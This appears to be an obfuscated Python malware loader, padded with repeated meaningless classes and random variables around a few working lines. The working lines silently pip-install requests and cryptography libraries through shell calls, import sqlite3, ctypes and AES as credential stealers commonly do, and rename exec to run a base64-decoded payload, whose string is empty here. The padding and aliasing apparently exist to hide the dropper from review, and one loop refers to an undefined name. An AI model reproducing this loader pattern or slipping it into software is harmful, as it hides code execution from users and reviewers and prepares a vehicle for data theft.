

from sys import executable, stderr
Akb3fjNOrw = 14108098
class N4zFSaNNRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'SczayDp', 'age': 61}
class VYnw2UIh6L:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
CbpULKWj22 = 13981156
class g0W6OFMHi2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
sTRm77KvHZ = 45175263
pUW0rObJCQ = 33546977
class IS9B3jeJQC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'r8Wrl02klM'
class fwWb0k5d7s:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class nkKMU1cS2X:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
uCBsdwddAD = 50115924
class N1goRVq8fg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
pNM3F0CAcN = 47841992
class PbOZKFaAwW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
gTCf7vx2Vw = 90072744
class divsMyYLXA:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
yknZeYZeky = 37720914
["'aOUOFQsjzi'", "'YHtd1kOVRc'", "'bbOVE6K0dS'", "'EF14RUPr1v'", "'VJrW4DLW4g'"]
gwHPvuu61X = 22933079
class jxrNQMbM2g:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
W4sTXyNfvT = 12188886
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
Akb3fjNOrw = 14108098
class N4zFSaNNRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'SczayDp', 'age': 61}
class VYnw2UIh6L:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
CbpULKWj22 = 13981156
class g0W6OFMHi2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
sTRm77KvHZ = 45175263
pUW0rObJCQ = 33546977
class IS9B3jeJQC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'r8Wrl02klM'
class fwWb0k5d7s:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class nkKMU1cS2X:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
uCBsdwddAD = 50115924
class N1goRVq8fg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
pNM3F0CAcN = 47841992
class PbOZKFaAwW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
gTCf7vx2Vw = 90072744
class divsMyYLXA:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
yknZeYZeky = 37720914
["'aOUOFQsjzi'", "'YHtd1kOVRc'", "'bbOVE6K0dS'", "'EF14RUPr1v'", "'VJrW4DLW4g'"]
gwHPvuu61X = 22933079
class jxrNQMbM2g:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
W4sTXyNfvT = 12188886
GiWQQxhHwhuhzZzAMKKvoPnvnihqfbbtJnn2WF = exec
Akb3fjNOrw = 14108098
class N4zFSaNNRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'SczayDp', 'age': 61}
class VYnw2UIh6L:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
CbpULKWj22 = 13981156
class g0W6OFMHi2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
sTRm77KvHZ = 45175263
pUW0rObJCQ = 33546977
class IS9B3jeJQC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'r8Wrl02klM'
class fwWb0k5d7s:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class nkKMU1cS2X:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
uCBsdwddAD = 50115924
class N1goRVq8fg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
pNM3F0CAcN = 47841992
class PbOZKFaAwW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
gTCf7vx2Vw = 90072744
class divsMyYLXA:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
yknZeYZeky = 37720914
["'aOUOFQsjzi'", "'YHtd1kOVRc'", "'bbOVE6K0dS'", "'EF14RUPr1v'", "'VJrW4DLW4g'"]
gwHPvuu61X = 22933079
class jxrNQMbM2g:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
W4sTXyNfvT = 12188886
import concurrent.futures
yto6XAH0XANjN0q1gJCOMjOWmbFwonuKl1jfJy=""
GiWQQxhHwhuhzZzAMKKvoPnvnihqfbbtJnn2WF(base64.b64decode(yto6XAH0XANjN0q1gJCOMjOWmbFwonuKl1jfJy))
Akb3fjNOrw = 14108098
class N4zFSaNNRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'SczayDp', 'age': 61}
class VYnw2UIh6L:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
CbpULKWj22 = 13981156
class g0W6OFMHi2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
sTRm77KvHZ = 45175263
pUW0rObJCQ = 33546977
class IS9B3jeJQC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'r8Wrl02klM'
class fwWb0k5d7s:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class nkKMU1cS2X:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
uCBsdwddAD = 50115924
class N1goRVq8fg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
pNM3F0CAcN = 47841992
class PbOZKFaAwW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
gTCf7vx2Vw = 90072744
class divsMyYLXA:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
yknZeYZeky = 37720914
["'aOUOFQsjzi'", "'YHtd1kOVRc'", "'bbOVE6K0dS'", "'EF14RUPr1v'", "'VJrW4DLW4g'"]
gwHPvuu61X = 22933079
class jxrNQMbM2g:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
W4sTXyNfvT = 12188886